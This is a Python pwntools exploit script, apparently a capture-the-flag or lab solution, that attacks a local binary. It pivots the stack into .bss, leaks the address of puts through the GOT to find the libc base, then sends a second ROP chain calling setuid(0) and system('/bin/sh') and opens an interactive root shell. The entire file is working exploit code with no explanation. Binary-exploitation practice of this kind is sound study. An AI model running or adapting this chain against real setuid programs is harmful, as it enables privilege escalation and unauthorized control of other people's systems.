#!/bin/python

from pwn import * 
import sys

context.arch = 'amd64'

FUNC_NAME="challenge"
BUFFER_LEN=0x18
BSS_IN=0x414080

elf = None
rop = None
libc = None


def set_rsp(addr):
    rop.rbp = addr
    rop.raw(rop.leave)
    rop.raw('A' * 8) #rbp


def get_payload(args, proc: process):
    global elf, rop, libc

    elf = proc.elf 
    rop = ROP(elf)
    libc = elf.libc

    bss = elf.get_section_by_name('.bss')
#    import IPython; IPython.embed()


    vuln_func = elf.functions[FUNC_NAME]

    set_rsp(BSS_IN + BUFFER_LEN)
    rop.puts(elf.got['puts'])

    rop.raw(rop.ret)
    rop.raw(elf.symbols['_start'])
    proc.send(rop.chain())

    proc.readuntil(b"Leaving!\n")
    puts_addr = u64(proc.readline(drop=True).ljust(8, b'\x00'))


    libc.address = puts_addr - libc.symbols['puts']


    old_chain_len = len(rop.chain())
    rop = ROP(elf)

    set_rsp(BSS_IN + BUFFER_LEN)

    rop.rdi = 0
    rop.raw(libc.symbols['setuid'])
    rop.rdi = next(libc.search(b'/bin/sh'))
    rop.raw(rop.ret)
    rop.raw(libc.symbols['system'])

    print(rop.dump())
    print(f"Libc base: {hex(libc.address)}")

    return rop.chain()


def main():
    proc = process(sys.argv[1])
    proc.send(get_payload(None, proc))

    proc.interactive()


if __name__ == '__main__':
    main()
